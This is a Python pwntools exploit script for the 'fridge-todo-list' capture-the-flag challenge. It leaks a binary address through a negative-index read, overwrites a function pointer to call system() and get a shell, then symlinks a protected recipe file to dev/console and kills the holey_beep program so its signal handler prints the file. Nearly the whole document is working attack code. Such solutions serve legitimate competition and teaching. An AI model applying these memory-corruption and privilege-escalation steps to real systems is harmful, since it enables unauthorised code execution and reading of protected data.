#!/usr/bin/env python2
from pwn import *
from struct import unpack,pack
from time import sleep
r = remote("fridge-todo-list.ctfcompetition.com",1337)
r.send("hacker\n")
r.readuntil(">")
r.send("2\n")
r.readuntil("read?")
r.send("-6\n")
res = r.readuntil("Hi hacker,").splitlines()[0]
write_addr = res.split(':',1)[1][1:].ljust(8,chr(0))
write_addr = unpack("<Q",write_addr)[0]
base_addr = write_addr-0x910
system_addr = base_addr + 0x940
r.readuntil(">")
r.send("3\n")
r.readuntil("entry?")
r.send("-4\n")
r.send("A"*8+pack("<Q",system_addr)+"\n")
r.send("/bin/sh\n")
sleep(1)
'''
	Exploit by BOAK but makes complete sense
	IDA or Radare2 shows the signal handler prints the argument passed in.
	If we can kill the holey_beep while it has opened dev/console which we linked to
	/secret_cake_recipe (Permission locked) then we can err the contents of the file.
	Thus getting the famous recipe.
'''
r.send("cd /tmp\n")
r.send("mkdir dev\n")
r.send("ln -s /secret_cake_recipe dev/console\n")
r.send("echo '#!/bin/bash' > /tmp/script.sh\n")
r.send("echo 'sleep 3' >> /tmp/script.sh\n")
r.send("echo 'cat -' >> /tmp/script.sh\n")
r.send("chmod +x script.sh\n")
sleep(1)
r.send("/home/user/holey_beep $(seq 1 10000) 2>&1 | /tmp/script.sh&\n")
sleep(1)
r.send("kill -15 `pidof /home/user/holey_beep`\n")
r.interactive()
